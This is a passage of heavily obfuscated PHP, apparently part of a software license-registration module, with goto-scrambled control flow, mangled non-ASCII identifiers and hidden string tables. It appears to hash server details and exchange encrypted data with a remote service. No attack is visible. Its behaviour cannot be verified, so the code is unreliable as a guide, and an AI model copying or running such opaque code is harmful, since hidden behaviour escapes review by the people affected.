$this->defaultAction); $bâù∑ﬂ√£¨[39]($bâù∑ﬂ√£¨[43], MOD . $bâù∑ﬂ√£¨[1] . ST . $bâù∑ﬂ√£¨[1] . ACT); $b«Á¡∫ì»Ù = $béáπª«Ôí[577]; goto eËÇ±Ïåíâ; füÖñéê„‡: $béáπª«Ôí =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bâù∑ﬂ√£¨ =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][37]}(); goto Bùàåî¡≤Ç; fÃó‰ãœË∏: } private $fdhc4c7b6e7c = array(); private $pcel6d336628 = ''; public function xfvh1dd5a7d2() { goto fØ»∏ØÆç∂; DúñîŒÈ¢…: $F¨Î«âô§õ = $cÔÂö†ñÁ[587]; goto DÓÒ¶ÑÒ∏®; e√‡£Ô¥ñ‰: $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][3]}($BÑÔËé°“€[57], array($this, $BÑÔËé°“€[58])); $CÈÉÓõ¿– = $cÔÂö†ñÁ[586]; $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][3]}($BÑÔËé°“€[59], array($this, $BÑÔËé°“€[60])); goto DúñîŒÈ¢…; BâèÆŸßÃ€: $d∫üøä©”ï = $cÔÂö†ñÁ[582]; if (!$d∫üøä©”ï) { die; } $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][51]}(); goto B‰ù©◊∆ºŸ; B‰ù©◊∆ºŸ: $fªŸ∏œ„ÊÕ = $cÔÂö†ñÁ[583]; if (!$fªŸ∏œ„ÊÕ) { return; } $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][52]}(); goto cº”áç˜œ¢; DÈô˜Ó∂è†: $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][3]}($BÑÔËé°“€[55], array($this, $BÑÔËé°“€[56])); $Cãã¬÷∫§ = $cÔÂö†ñÁ[585]; if (strlen($Cãã¬÷∫§) < $cÔÂö†ñÁ[548]) { return; } goto e√‡£Ô¥ñ‰; cº”áç˜œ¢: $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][3]}($BÑÔËé°“€[53], array($this, $BÑÔËé°“€[54])); $b›ÉƒèÙıÖ = $cÔÂö†ñÁ[584]; if (!$b›ÉƒèÙıÖ) { die; } goto DÈô˜Ó∂è†; fØ»∏ØÆç∂: $cÔÂö†ñÁ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BÑÔËé°“€ =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][46]}(); goto dÃ…õá≤ıà; C≤ç¢≤ Ÿﬁ: $aÆ∑ë“ºú® = $cÔÂö†ñÁ[580]; if (!$aÆ∑ë“ºú®) { return; } $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][49]}(); goto dÏÉªË ›˘; dÃ…õá≤ıà: $Bå≈±◊ûåê = $cÔÂö†ñÁ[578]; while (strlen($Bå≈±◊ûåê) < $cÔÂö†ñÁ[563]) { if (!$Bå≈±◊ûåê) { break; } $Bå≈±◊ûåê++; } $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][47]}(); goto Cû≠âœÀ˜ô; dÏÉªË ›˘: $FÊ©¥¿êâ÷ = $cÔÂö†ñÁ[581]; while ($FÊ©¥¿êâ÷ < $cÔÂö†ñÁ[555]) { if ($FÊ©¥¿êâ÷ >= 0) { break; } $FÊ©¥¿êâ÷++; } $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][50]}(); goto BâèÆŸßÃ€; Cû≠âœÀ˜ô: $c‰ë§ÆÑ«ó = $cÔÂö†ñÁ[579]; if (!$c‰ë§ÆÑ«ó) { die; } $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][48]}(); goto C≤ç¢≤ Ÿﬁ; DÓÒ¶ÑÒ∏®: } public function rplw21191b88($DÏ∫¿Éˆï‹) { goto Cù∫≈’πµ≠; DÓ¬„›±Œù: if (!$d©ÚÃÁÚÌÊ) { return; } unset($DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[93]][$d”øøŒ∂›ˆ[95]][$d”øøŒ∂›ˆ[97]]); unset($DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[93]][$d”øøŒ∂›ˆ[94]][$d”øøŒ∂›ˆ[76]]); goto c‚œ≥√æ˜Ô; C÷ÁÖÿÔ£å: $DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[108]][$d”øøŒ∂›ˆ[120]] = $this->pcel6d336628; if ($D…–Áÿ—˜ç[$d”øøŒ∂›ˆ[120]] != $d”øøŒ∂›ˆ[121]) { $DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[108]][$d”øøŒ∂›ˆ[122]] = $D…–Áÿ—˜ç[$d”øøŒ∂›ˆ[122]]; $DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[108]][$d”øøŒ∂›ˆ[123]] = $D…–Áÿ—˜ç[$d”øøŒ∂›ˆ[123]]; $bó¢ª±Ì„¿ = $d”øøŒ∂›ˆ[124](10) . $this->pcel6d336628 . $d”øøŒ∂›ˆ[124](5); $DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[93]][$d”øøŒ∂›ˆ[125]][$d”øøŒ∂›ˆ[126]] = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][127]}($bó¢ª±Ì„¿, $DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[108]][$d”øøŒ∂›ˆ[113]]); } if ($this->pcel6d336628 == $d”øøŒ∂›ˆ[121]) { $DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[93]][$d”øøŒ∂›ˆ[94]][$d”øøŒ∂›ˆ[99]][$d”øøŒ∂›ˆ[107]] = 0; } goto cˆ¢ÑàÇ‡©; CÃÌΩè‰∂‚: $DŸˆÜ¯÷±Î = $Cî«ú“∫Ì®[592]; $DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[93]][$d”øøŒ∂›ˆ[94]][$d”øøŒ∂›ˆ[99]] = array($d”øøŒ∂›ˆ[100] => (int) $DÏﬁÀùã–Í[$d”øøŒ∂›ˆ[101]], $d”øøŒ∂›ˆ[102] => $d”øøŒ∂›ˆ[103]($d”øøŒ∂›ˆ[104]($DÏﬁÀùã–Í, $d”øøŒ∂›ˆ[105], array())), $d”øøŒ∂›ˆ[106] => (int) $d”øøŒ∂›ˆ[104]($DÏﬁÀùã–Í, $d”øøŒ∂›ˆ[107], 0)); $DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[108]][$d”øøŒ∂›ˆ[109]] = $d”øøŒ∂›ˆ[110]($d”øøŒ∂›ˆ[111])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][112]}(); goto Eæ•„Õà∂ë; fÑ£±Ùæ¯ï: $DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[108]][$d”øøŒ∂›ˆ[117]] = $d”øøŒ∂›ˆ[118]($d”øøŒ∂›ˆ[119]()); $aíçÆ°ßÁ‹ = $Cî«ú“∫Ì®[594]; if (!$aíçÆ°ßÁ‹) { return; } goto C÷ÁÖÿÔ£å; CÃ¡®ÎÌΩ¨: $d∆Ûö√Ó£´ = array($d”øøŒ∂›ˆ[64], $d”øøŒ∂›ˆ[65], $d”øøŒ∂›ˆ[66], $d”øøŒ∂›ˆ[67], $d”øøŒ∂›ˆ[68], $d”øøŒ∂›ˆ[69], $d”øøŒ∂›ˆ[70], $d”øøŒ∂›ˆ[71], $d”øøŒ∂›ˆ[72], $d”øøŒ∂›ˆ[73], $d”øøŒ∂›ˆ[74], $d”øøŒ∂›ˆ[75], $d”øøŒ∂›ˆ[76], $d”øøŒ∂›ˆ[77], $d”øøŒ∂›ˆ[78], $d”øøŒ∂›ˆ[79], $d”øøŒ∂›ˆ[80], $d”øøŒ∂›ˆ[81], $d”øøŒ∂›ˆ[82], $d”øøŒ∂›ˆ[83], $d”øøŒ∂›ˆ[84], $d”øøŒ∂›ˆ[85], $d”øøŒ∂›ˆ[86], $d”øøŒ∂›ˆ[87], $d”øøŒ∂›ˆ[88], $d”øøŒ∂›ˆ[89], $d”øøŒ∂›ˆ[90]); $d÷ÔÿÁ‡ñÒ = $Cî«ú“∫Ì®[588]; foreach ($d∆Ûö√Ó£´ as $Cƒ≤∏÷àé‰) { $fë»¨ÒÖÖ⁄ = $GLOBALS[$d”øøŒ∂›ˆ[91]][$d”øøŒ∂›ˆ[92]][$Cƒ≤∏÷àé‰]; $Fÿ¥êäÃœØ = $Cî«ú“∫Ì®[589]; if (!$Fÿ¥êäÃœØ) { die; } if (isset($D…–Áÿ—˜ç[$Cƒ≤∏÷àé‰])) { $fë»¨ÒÖÖ⁄ = $D…–Áÿ—˜ç[$Cƒ≤∏÷àé‰]; } $DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[93]][$d”øøŒ∂›ˆ[94]][$Cƒ≤∏÷àé‰] = $fë»¨ÒÖÖ⁄; } goto A—“§ÕÜ€º; Eæ•„Õà∂ë: $DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[108]][$d”øøŒ∂›ˆ[113]] = $d”øøŒ∂›ˆ[114]($_SERVER[$d”øøŒ∂›ˆ[115]] . $D…–Áÿ—˜ç[$d”øøŒ∂›ˆ[116]]); $cÇîﬁÀ™¡ç = $Cî«ú“∫Ì®[593]; if (!$cÇîﬁÀ™¡ç) { die; } goto fÑ£±Ùæ¯ï; c‚œ≥√æ˜Ô: $EéÜ„à’”á = $Cî«ú“∫Ì®[591]; if (!$EéÜ„à’”á) { return; } unset($DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[93]][$d”øøŒ∂›ˆ[94]][$d”øøŒ∂›ˆ[98]]); goto CÃÌΩè‰∂‚; cå°öåç®Ú: if (strlen($F‡ÜîÛÚÕì) < $Cî«ú“∫Ì®[563]) { die; } if ($d”øøŒ∂›ˆ[104]($GLOBALS, $d”øøŒ∂›ˆ[132]) && $this->config[$d”øøŒ∂›ˆ[133]]) { $DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[108]][$d”øøŒ∂›ˆ[134]] = WEB_ROOT; } return $DÏ∫¿Éˆï‹; goto d∆¢â∆›»Î; cˆ¢ÑàÇ‡©: $DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[108]][$d”øøŒ∂›ˆ[128]] = $d”øøŒ∂›ˆ[104]($this->fdhc4c7b6e7c, $d”øøŒ∂›ˆ[129], $d”øøŒ∂›ˆ[10]); $DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[108]][$d”øøŒ∂›ˆ[130]] = $d”øøŒ∂›ˆ[104]($this->fdhc4c7b6e7c, $d”øøŒ∂›ˆ[131], $d”øøŒ∂›ˆ[10]); $F‡ÜîÛÚÕì = $Cî«ú“∫Ì®[595]; goto cå°öåç®Ú; A—“§ÕÜ€º: $DÏﬁÀùã–Í = $DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[93]][$d”øøŒ∂›ˆ[94]][$d”øøŒ∂›ˆ[76]]; unset($DÏ∫¿Éˆï‹[$d”øøŒ∂›ˆ[93]][$d”øøŒ∂›ˆ[95]][$d”øøŒ∂›ˆ[96]]); $d©ÚÃÁÚÌÊ = $Cî«ú“∫Ì®[590]; goto DÓ¬„›±Œù; Cù∫≈’πµ≠: $Cî«ú“∫Ì® =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $d”øøŒ∂›ˆ =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $D…–Áÿ—˜ç = $d”øøŒ∂›ˆ[61]($d”øøŒ∂›ˆ[62])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][63]}(); goto CÃ¡®ÎÌΩ¨; d∆¢â∆›»Î: } private function jrqpf4702baa() { goto eâå‡çúŒ”; eâå‡çúŒ”: $cé™ñ®«Ñ» =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bËëöﬂñçÉ =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; if ($_SERVER[$bËëöﬂñçÉ[44]] == $bËëöﬂñçÉ[135]) { goto DÂºÚäª—È; bπøÂöêΩÖ: if (strlen($f°¿é‰¥òè) < $cé™ñ®«Ñ»[563]) { return; } $bËëöﬂñçÉ[13](array($bËëöﬂñçÉ[151], $bËëöﬂñçÉ[152]), $Bµœ¥ìÇÒÿ); $EÎÇäÑÓ°» = $cé™ñ®«Ñ»[598]; goto a•óÏùíï¬; c≠¯ƒ«±ÉÍ: $e«¥“¬Á‰å = $cé™ñ®«Ñ»[596]; $Bµœ¥ìÇÒÿ = array($bËëöﬂñçÉ[150] => $D≥„å Û•Ô); $f°¿é‰¥òè = $cé™ñ®«Ñ»[597]; goto bπøÂöêΩÖ; DÂºÚäª—È: $D≥„å Û•Ô = array($bËëöﬂñçÉ[120] => $this->pcel6d336628, $bËëöﬂñçÉ[136] => $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][137]}(), $bËëöﬂñçÉ[138] => $bËëöﬂñçÉ[61]($bËëöﬂñçÉ[139])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][140]}()); if ($this->pcel6d336628 != $bËëöﬂñçÉ[121]) { $fø∑àò°Õí = $bËëöﬂñçÉ[104]($this->fdhc4c7b6e7c, $bËëöﬂñçÉ[141]); if ($fø∑àò°Õí) { $D≥„å Û•Ô[$bËëöﬂñçÉ[142]] = $fø∑àò°Õí; $D≥„å Û•Ô[$bËëöﬂñçÉ[143]] = $bËëöﬂñçÉ[144]($bËëöﬂñçÉ[104]($this->fdhc4c7b6e7c, $bËëöﬂñçÉ[145])); $D≥„å Û•Ô[$bËëöﬂñçÉ[146]] = $bËëöﬂñçÉ[104]($this->fdhc4c7b6e7c, $bËëöﬂñçÉ[131]); } } $D≥„å Û•Ô = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][147]}($bËëöﬂñçÉ[148]($D≥„å Û•Ô), $bËëöﬂñçÉ[114]($bËëöﬂñçÉ[149])); goto c≠¯ƒ«±ÉÍ; a•óÏùíï¬: } goto b´ø√ò¶û´; b´ø√ò¶û´: if ($this->pcel6d336628 == $bËëöﬂñçÉ[121]) { return; } $a⁄¿˜˘Ö‡ª = array($bËëöﬂñçÉ[153], $bËëöﬂñçÉ[154], $bËëöﬂñçÉ[155], $bËëöﬂñçÉ[156], $bËëöﬂñçÉ[157], $bËëöﬂñçÉ[158]); $F„≤ƒâì¨û = $bËëöﬂñçÉ[61]($bËëöﬂñçÉ[62])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][63]}(); goto a–¶•≈äÊÀ; a–¶•≈äÊÀ: $Bµœ¥ìÇÒÿ = array($bËëöﬂñçÉ[159] => $F„≤ƒâì¨û[$bËëöﬂñçÉ[64]], $bËëöﬂñçÉ[160] => $F„≤ƒâì¨û[$bËëöﬂñçÉ[65]], $bËëöﬂñçÉ[161] => $bËëöﬂñçÉ[10]); foreach ($a⁄¿˜˘Ö‡ª as $F√∫“¡≈Öê) { if (!isset($F„≤ƒâì¨û[$F√∫“¡≈Öê]) || !$F„≤ƒâì¨û[$F√∫“¡≈Öê]) { continue; } $Bµœ¥ìÇÒÿ[$F√∫“¡≈Öê] = $F„≤ƒâì¨û[$F√∫“¡≈Öê]; $fëÆ‡˘¬Áû = $cé™ñ®«Ñ»[599]; while ($fëÆ‡˘¬Áû < $cé™ñ®«Ñ»[557]) { if ($fëÆ‡˘¬Áû >= 0) { break; } $fëÆ‡˘¬Áû++; } } $bËëöﬂñçÉ[13](array($bËëöﬂñçÉ[151], $bËëöﬂñçÉ[152]), $Bµœ¥ìÇÒÿ); goto b ‡äá€Ù˜; b ‡äá€Ù˜: } private function aqyta9a8f3d6() { goto eÇ”ÏÓ…ı¨; EëΩ’¶´ã’: if (strlen($câ√ﬂôˆÖ´) < $bÆüè»ñ®œ[548]) { return; } $Cü√ôÈåëº = array(); $Cü√ôÈåëº[$CƒıöËîêû] = $CÎõÂ´Û˜ã; goto dÉâÆ®á√„; Aû€Æ¬ÏÖ„: $EÜå≤¢ÿ≈ú = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][199]}($Bò˘®∞ÁÍ·[$eπ≠∏⁄≤πç[200]]); $dñïŸûòı = $bÆüè»ñ®œ[601]; if (!$dñïŸûòı) { return; } goto f∫ó£⁄ç∂†; f∞æîƒæÙÈ: if (!$f∆ôÇï»ÜÒ) { die; } $DÛ∫ÿƒˆó’ = $A®êÃ√«è®[$eπ≠∏⁄≤πç[225]]; $câ√ﬂôˆÖ´ = $bÆüè»ñ®œ[608]; goto EëΩ’¶´ã’; cœ´÷âòÙ¢: if (strlen($f©÷©⁄¿¶ç) < $bÆüè»ñ®œ[563]) { die; } $eπ≠∏⁄≤πç[166]($eπ≠∏⁄≤πç[197]($eπ≠∏⁄≤πç[208]), !0); goto cêç‰—“¯’; BÒ◊ÛÙàß∆: if (!$D¨ ¨¬Òµ) { die; } $F∑õ÷ÎÃ∑È = $E¯ü¢®≈–§ . $DøõÉ‚ç©ì[$eπ≠∏⁄≤πç[120]] . $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][147]}($eπ≠∏⁄≤πç[114]($DøõÉ‚ç©ì[$eπ≠∏⁄≤πç[209]]), $E¯ü¢®≈–§); $bµå¬∆éÊº = $bÆüè»ñ®œ[604]; goto Dëﬂä‹ëπª; Dëﬂä‹ëπª: $DøõÉ‚ç©ì[$eπ≠∏⁄≤πç[123]] = $eπ≠∏⁄≤πç[118]($eπ≠∏⁄≤πç[214]($this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][147]}($F∑õ÷ÎÃ∑È, $eπ≠∏⁄≤πç[216]))); $d£¬ïã°∑€ = $bÆüè»ñ®œ[605]; if (strlen($d£¬ïã°∑€) < $bÆüè»ñ®œ[552]) { die; } goto dËãã˘Î°Û; fßù±ıÑªõ: $DøõÉ‚ç©ì[$eπ≠∏⁄≤πç[122]] = $eπ≠∏⁄≤πç[214]($eπ≠∏⁄≤πç[118]($this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][147]}($d‹»Ú˘Ÿ»”, $eπ≠∏⁄≤πç[215]))); $E¯ü¢®≈–§ = $eπ≠∏⁄≤πç[124](16); $D¨ ¨¬Òµ = $bÆüè»ñ®œ[603]; goto BÒ◊ÛÙàß∆; dËãã˘Î°Û: if ($Bò˘®∞ÁÍ·[$eπ≠∏⁄≤πç[217]] && $Bò˘®∞ÁÍ·[$eπ≠∏⁄≤πç[217]] >= 1) { $eπ≠∏⁄≤πç[61]($eπ≠∏⁄≤πç[62])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][218]}($eπ≠∏⁄≤πç[219], $eπ≠∏⁄≤πç[220]); } $eπ≠∏⁄≤πç[61]($eπ≠∏⁄≤πç[62])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][221]}($DøõÉ‚ç©ì); $DÍ˘ÂœâÙ€ = $eπ≠∏⁄≤πç[114]($_SERVER[$eπ≠∏⁄≤πç[115]] . $eπ≠∏⁄≤πç[214]($AÒÏÁÁ—è√) . $DøõÉ‚ç©ì[$eπ≠∏⁄≤πç[210]]); goto E≈ïæÇãåç; f∫ó£⁄ç∂†: if (!$EÜå≤¢ÿ≈ú || $EÜå≤¢ÿ≈ú != $eπ≠∏⁄≤πç[201]($Bò˘®∞ÁÍ·[$eπ≠∏⁄≤πç[145]])) { $aìç—òﬂ¯ó = array($eπ≠∏⁄≤πç[202] => $eπ≠∏⁄≤πç[61]($eπ≠∏⁄≤πç[62])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][63]}($eπ≠∏⁄≤πç[116]), $eπ≠∏⁄≤πç[203] => $_SERVER[$eπ≠∏⁄≤πç[115]], $eπ≠∏⁄≤πç[204] => $eπ≠∏⁄≤πç[205](), $eπ≠∏⁄≤πç[174] => $_SERVER[$eπ≠∏⁄≤πç[175]]); $eπ§‘º∫œœ = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][206]}($eπ≠∏⁄≤πç[148]($aìç—òﬂ¯ó)); $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][182]}($eπ≠∏⁄≤πç[207] . $eπ§‘º∫œœ); $eπ≠∏⁄≤πç[166]($eπ≠∏⁄≤πç[197]($eπ≠∏⁄≤πç[208]), !0); } $DøõÉ‚ç©ì = array($eπ≠∏⁄≤πç[209] => $c√ΩΩìöÕŒ[$eπ≠∏⁄≤πç[165]], $eπ≠∏⁄≤πç[210] => $Bò˘®∞ÁÍ·[$eπ≠∏⁄≤πç[211]], $eπ≠∏⁄≤πç[212] => $eπ≠∏⁄≤πç[124](16), $eπ≠∏⁄≤πç[120] => $Bò˘®∞ÁÍ·[$eπ≠∏⁄≤πç[213]]); if ($c√ΩΩìöÕŒ[$eπ≠∏⁄≤πç[168]]) { $DøõÉ‚ç©ì[$eπ≠∏⁄≤πç[212]] = $c√ΩΩìöÕŒ[$eπ≠∏⁄≤πç[168]]; } goto EúõÈûë ´; B⁄†∫”‹Ãÿ: if (!$eπ≠∏⁄≤πç[104]($GLOBALS, $eπ≠∏⁄≤πç[132])) { die; } $bÿŒ«˘ëã» = $GLOBALS[$eπ≠∏⁄≤πç[22]]; if (isset($bÿŒ«˘ëã»[$eπ≠∏⁄≤πç[163]])) { $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][164]}(); die; } goto DØ‚àˆ˘ñÉ; eÇ”ÏÓ…ı¨: $bÆüè»ñ®œ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eπ≠∏⁄≤πç =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; if ($_SERVER[$eπ≠∏⁄≤πç[44]] != $eπ≠∏⁄≤πç[162]) { return; } goto B⁄†∫”‹Ãÿ; E≈ïæÇãåç: $dø·„ùÑ¢ = $bÆüè»ñ®œ[606]; if (!$dø·„ùÑ¢) { die; } $CƒıöËîêû = $eπ≠∏⁄≤πç[214]($eπ≠∏⁄≤πç[25]($DÍ˘ÂœâÙ€, 10, 16)); goto f±©Ë›Ùëí; d»ó°Úœ—∆: while ($cë≥ÇäÛî® < $bÆüè»ñ®œ[557]) { if ($cë≥ÇäÛî® >= 0) { break; } $cë≥ÇäÛî®++; } $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][229]}(); $f©÷©⁄¿¶ç = $bÆüè»ñ®œ[611]; goto cœ´÷âòÙ¢; e•çÔ¬‰Ö¿: $A’≠ì„ÕìÕ = $eπ≠∏⁄≤πç[114]($_SERVER[$eπ≠∏⁄≤πç[115]] . $AÒÏÁÁ—è√); $c¡ì±“«Ø± = $bÆüè»ñ®œ[600]; if (strlen($c¡ì±“«Ø±) < $bÆüè»ñ®œ[555]) { return; } goto bç√ÆÔÈ≤é; f±©Ë›Ùëí: $CÎõÂ´Û˜ã = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][127]}($eπ≠∏⁄≤πç[148]($Bò˘®∞ÁÍ·), $DÍ˘ÂœâÙ€); $A®êÃ√«è® = $eπ≠∏⁄≤πç[222]($eπ≠∏⁄≤πç[61]($eπ≠∏⁄≤πç[11])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][223]}(), $eπ≠∏⁄≤πç[224]); $f∆ôÇï»ÜÒ = $bÆüè»ñ®œ[607]; goto f∞æîƒæÙÈ; DØ‚àˆ˘ñÉ: if (!isset($bÿŒ«˘ëã»[$eπ≠∏⁄≤πç[165]]) || $eπ≠∏⁄≤πç[24]($bÿŒ«˘ëã»[$eπ≠∏⁄≤πç[165]]) != 16) { $eπ≠∏⁄≤πç[166]($eπ≠∏⁄≤πç[167] . $bÿŒ«˘ëã»[$eπ≠∏⁄≤πç[165]], !1); } $AÒÏÁÁ—è√ = $eπ≠∏⁄≤πç[61]($eπ≠∏⁄≤πç[62])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][63]}($eπ≠∏⁄≤πç[116]); $c√ΩΩìöÕŒ = array($eπ≠∏⁄≤πç[165] => $bÿŒ«˘ëã»[$eπ≠∏⁄≤πç[165]], $eπ≠∏⁄≤πç[168] => $eπ≠∏⁄≤πç[124](16), $eπ≠∏⁄≤πç[169] => $eπ≠∏⁄≤πç[149], $eπ≠∏⁄≤πç[170] => $eπ≠∏⁄≤πç[171], $eπ≠∏⁄≤πç[172] => $_SERVER[$eπ≠∏⁄≤πç[173]], $eπ≠∏⁄≤πç[174] => $_SERVER[$eπ≠∏⁄≤πç[175]], $eπ≠∏⁄≤πç[176] => $_SERVER[$eπ≠∏⁄≤πç[177]]); goto e•çÔ¬‰Ö¿; dÉâÆ®á√„: $eπ≠∏⁄≤πç[61]($eπ≠∏⁄≤πç[11])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][226]}($DÛ∫ÿƒˆó’[$eπ≠∏⁄≤πç[227]], array($eπ≠∏⁄≤πç[228] => $Cü√ôÈåëº)); $cÊËôëπÀÀ = $bÆüè»ñ®œ[609]; if (!$cÊËôëπÀÀ) { die; } goto båå‘ËÕëø; bç√ÆÔÈ≤é: if ($bÿŒ«˘ëã»[$eπ≠∏⁄≤πç[178]] == $eπ≠∏⁄≤πç[179]) { $DöÔ•Ñ¡®‹ = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][147]}($A’≠ì„ÕìÕ, $eπ≠∏⁄≤πç[180]); $eπ§‘º∫œœ = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][127]}($eπ≠∏⁄≤πç[148]($c√ΩΩìöÕŒ), $A’≠ì„ÕìÕ . $eπ≠∏⁄≤πç[181], 3); $E®Ü´™∏îÑ = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][182]}($eπ≠∏⁄≤πç[183] . $DöÔ•Ñ¡®‹ . $eπ≠∏⁄≤πç[184] . $eπ§‘º∫œœ, -1); $eπ≠∏⁄≤πç[166]($E®Ü´™∏îÑ, !0); } else { if ($bÿŒ«˘ëã»[$eπ≠∏⁄≤πç[178]] == $eπ≠∏⁄≤πç[185]) { $Eè≥¨‹ÕÙ” = $eπ≠∏⁄≤πç[25]($eπ≠∏⁄≤πç[114]($eπ≠∏⁄≤πç[186] . $A’≠ì„ÕìÕ), 12, 15) . $eπ≠∏⁄≤πç[187]; $eπ§‘º∫œœ = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][188]}($eπ≠∏⁄≤πç[2]($bÿŒ«˘ëã»[$eπ≠∏⁄≤πç[189]]), $Eè≥¨‹ÕÙ”, 2); $Bí—ïÑãé∂ = $eπ≠∏⁄≤πç[190]($eπ§‘º∫œœ, !0); if (!$eπ≠∏⁄≤πç[191]($Bí—ïÑãé∂) || !$eπ≠∏⁄≤πç[191]($Bí—ïÑãé∂[$eπ≠∏⁄≤πç[192]]) || $Bí—ïÑãé∂[$eπ≠∏⁄≤πç[165]] != !0) { $d»ø⁄Ô˘Öä = $eπ≠∏⁄≤πç[193]; $dÁ¯ÑÇÏ∫≈ = $Bí—ïÑãé∂[$eπ≠∏⁄≤πç[192]] ? $eπ≠∏⁄≤πç[194] . $Bí—ïÑãé∂[$eπ≠∏⁄≤πç[192]] : $d»ø⁄Ô˘Öä; $eπ≠∏⁄≤πç[166]($dÁ¯ÑÇÏ∫≈, !1); } else { $c√ΩΩìöÕŒ[$eπ≠∏⁄≤πç[168]] = $Bí—ïÑãé∂[$eπ≠∏⁄≤πç[192]][$eπ≠∏⁄≤πç[195]]; } } else { $Bí—ïÑãé∂ = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][182]}($eπ≠∏⁄≤πç[196], $c√ΩΩìöÕŒ, 10); } } if (!$eπ≠∏⁄≤πç[191]($Bí—ïÑãé∂) || !$eπ≠∏⁄≤πç[191]($Bí—ïÑãé∂[$eπ≠∏⁄≤πç[192]]) || $Bí—ïÑãé∂[$eπ≠∏⁄≤πç[165]] != !0) { $d»ø⁄Ô˘Öä = $eπ≠∏⁄≤πç[197]($eπ≠∏⁄≤πç[198]); $dÁ¯ÑÇÏ∫≈ = $Bí—ïÑãé∂[$eπ≠∏⁄≤πç[192]] ? $eπ≠∏⁄≤πç[194] . $Bí—ïÑãé∂[$eπ≠∏⁄≤πç[192]] : $d»ø⁄Ô˘Öä; $eπ≠∏⁄≤πç[166]($dÁ¯ÑÇÏ∫≈, !1); } $Bò˘®∞ÁÍ· = $Bí—ïÑãé∂[$eπ≠∏⁄≤πç[192]]; goto Aû€Æ¬ÏÖ„; EúõÈûë ´: $E˜€«â¯¶Ì = $eπ≠∏⁄≤πç[25]($eπ≠∏⁄≤πç[114]($DøõÉ‚ç©ì[$eπ≠∏⁄≤πç[210]]), 10, 10); $d‹»Ú˘Ÿ»” = $E˜€«â¯¶Ì . $DøõÉ‚ç©ì[$eπ≠∏⁄≤πç[120]] . $DøõÉ‚ç©ì[$eπ≠∏⁄≤πç[212]]; $eÖ˘‹íÑÌÆ = $bÆüè»ñ®œ[602]; goto fßù±ıÑªõ; båå‘ËÕëø: $this->fdhc4c7b6e7c = $Bò˘®∞ÁÍ·; $this->pcel6d336628 = $DøõÉ‚ç©ì[$eπ≠∏⁄≤πç[120]]; $cë≥ÇäÛî® = $bÆüè»ñ®œ[610]; goto d»ó°Úœ—∆; cêç‰—“¯’: } private function licenseRegistSuccess() { $A«Ã˜éæ¢— =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $DìçâïÀçé = $A«Ã˜éæ¢—[61]($A«Ã˜éæ¢—[62])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][63]}(); $AÛûÓ°‹ë¡ = $_SERVER[Ä¿¡‡öóµŸﬂ‡][612]; if ($DìçâïÀçé[$A«Ã˜éæ¢—[85]] != 